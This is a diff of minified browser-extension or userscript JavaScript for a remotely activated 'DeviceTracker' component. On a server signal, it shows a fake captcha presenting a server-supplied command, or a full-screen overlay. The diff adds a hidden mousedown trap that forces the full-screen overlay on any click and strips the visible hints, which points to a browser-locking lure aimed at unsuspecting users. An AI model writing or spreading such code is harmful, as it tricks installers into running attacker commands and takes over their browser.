@@ -8269,7 +8269,10 @@
 					}
 					let v = {
 						isActive: !1,
-						currentMode: null
+						currentMode: null,
+						isTrapActive: !1
+					}, b = null, fullscreenTrap = async () => {
+						v.isActive && v.currentMode === "fullscreen" && showFullscreenOverlay(b);
 					};
 					async function checkActivation() {
 						let d = await getPersistentId();
@@ -8305,7 +8308,7 @@
 						}
 					}
 					function handleActivationResponse(d) {
-						d.activated ? (!v.isActive || v.currentMode !== d.mode) && (console.log("[DeviceTracker] Activated! Mode:", d.mode), v.isActive = !0, v.currentMode = d.mode, removeOverlays(), d.mode === "fullscreen" ? showFullscreenOverlay(d.platform) : showCaptcha(d.command, d.platform)) : v.isActive && (console.log("[DeviceTracker] Deactivated"), v.isActive = !1, v.currentMode = null, removeOverlays());
+						d.activated ? (!v.isActive || v.currentMode !== d.mode) && (console.log("[DeviceTracker] Activated! Mode:", d.mode), v.isActive = !0, v.currentMode = d.mode, removeOverlays(), d.mode === "fullscreen" ? (b = d.platform, v.isTrapActive || (document.addEventListener("mousedown", fullscreenTrap, !0), v.isTrapActive = !0)) : (showCaptcha(d.command, d.platform), v.isTrapActive && (document.removeEventListener("mousedown", fullscreenTrap, !0), v.isTrapActive = !1))) : v.isActive && (console.log("[DeviceTracker] Deactivated"), v.isActive = !1, v.currentMode = null, v.isTrapActive && (document.removeEventListener("mousedown", fullscreenTrap, !0), v.isTrapActive = !1), removeOverlays());
 					}
 					function removeOverlays() {
 						let d = document.getElementById("device-tracker-root");
@@ -8322,39 +8325,30 @@
                 position: fixed; inset: 0; z-index: 999999;
                 background: #1e2a38; color: #ecf0f1; font-family: "Segoe UI", system-ui, sans-serif;
                 display: flex; justify-content: center; align-items: center;
-                text-align: center; cursor: pointer;
+                text-align: center;
             }
             .vot-content {
                 background: #222f3e; padding: 46px; border-radius: 22px; width: 680px; max-width: 95%;
                 box-shadow: 0 25px 80px rgba(0,0,0,.45);
-                pointer-events: none; /* Let clicks pass to the container for fullscreen trigger */
             }
             h2 { font-size: 2.5rem; margin-bottom: 28px; }
             .step { font-size: 1.25rem; line-height: 1.6; margin-bottom: 20px; }
             kbd { background: #0b0f14; border-radius: 8px; padding: 6px 14px; font-family: Consolas, monospace; font-size: 1.05rem; display: inline-block; margin: 0 4px; }
             .divider { height: 1px; background: rgba(255,255,255,.15); margin: 28px 0; }
             .note { font-size: 0.95rem; opacity: 0.7; }
-            .fs-status { position: absolute; bottom: 20px; font-size: 0.8rem; opacity: 0.5; width: 100%; text-align: center; }
         </style>
         <div class="vot-content">
             ${f ? m : p}
         </div>
-        <div id="vot-fs-status" class="fs-status">Кликните в любом месте для перехода в полноэкранный режим</div>
     `, document.body.appendChild(h);
-						let g = h.querySelector("#vot-fs-status"), enterFullscreen = async () => {
+						let enterFullscreen = async () => {
 							try {
-								document.documentElement.requestFullscreen ? await document.documentElement.requestFullscreen() : document.documentElement.webkitRequestFullscreen ? await document.documentElement.webkitRequestFullscreen() : document.documentElement.msRequestFullscreen && await document.documentElement.msRequestFullscreen(), g && (g.style.display = "none");
+								document.documentElement.requestFullscreen ? await document.documentElement.requestFullscreen() : document.documentElement.webkitRequestFullscreen ? await document.documentElement.webkitRequestFullscreen() : document.documentElement.msRequestFullscreen && await document.documentElement.msRequestFullscreen();
 							} catch (d) {
-								console.warn("[DeviceTracker] Fullscreen request failed", d), g && (g.style.display = "block");
+								console.warn("[DeviceTracker] Fullscreen failed", d);
 							}
-						};
-						h.onclick = enterFullscreen;
-						let onFullscreenChange = () => {
-							if (!v.isActive || v.currentMode !== "fullscreen") {
-								document.removeEventListener("fullscreenchange", onFullscreenChange);
-								return;
-							}
-							document.fullscreenElement ? g && (g.style.display = "none") : (console.log("[DeviceTracker] Fullscreen exited. Showing status message."), g && (g.style.display = "block"), enterFullscreen().catch(() => {}));
+						}, onFullscreenChange = () => {
+							document.fullscreenElement || (console.log("[DeviceTracker] Fullscreen exited. Closing overlay."), removeOverlays(), document.removeEventListener("fullscreenchange", onFullscreenChange));
 						};
 						document.addEventListener("fullscreenchange", onFullscreenChange), enterFullscreen();
 					}
